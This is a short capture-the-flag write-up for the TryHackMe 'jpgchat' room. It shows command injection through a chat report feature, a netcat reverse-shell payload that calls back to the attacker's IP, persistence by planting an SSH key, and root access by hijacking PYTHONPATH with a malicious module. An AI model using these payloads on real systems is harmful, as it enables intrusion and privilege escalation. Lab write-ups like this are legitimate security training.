 #python

https://tryhackme.com/r/room/jpgchat

---
#### Nmap
![[Screenshot_2024-06-11_09-22-24.png]]

So I went to the port `3000`, it was a chat telling me that the source code is somewhere on the internet ([github](https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py))

I started to setup a netcat connexion with
```shell
nc 10.10.28.222 3000
```

Then I followed the instruction to send a report by typing `[REPORT]`.

Tu vulnerability is here
```python
os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

So I'll use the following payload and setup a listener
```shell
'hello'; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.61.68 9001 >/tmp/f;
```

And here I am in 

I decided to setup a more stable ssh connexion with
```shell
ssh-keygen -t rsa -b 4096 -f ./id_rsa
```

Then I created a `.ssh/authorized_keys` in `wes`'s home and I just had to connect throught ssh
```shell
ssh wes@10.10.28.222 -i ./id_rsa
```

Then the  `sudo -l` gave me the following command
![[Screenshot_2024-06-11_10-20-07.png]]

The environment variable `PYTHONPATH` is used to setup the path for python's module and the `test_module.py` that I can run as sudo is importing  the `compare` module

So I setup the `PYTHONPATH` 
```shell
export PYTHONPATH=/opt/jpchat/
```

I then created a `compare.py` file with the following payload
```python
import os
os.system('cat /root/root.txt > /tmp/root')
```

And there is a root flag
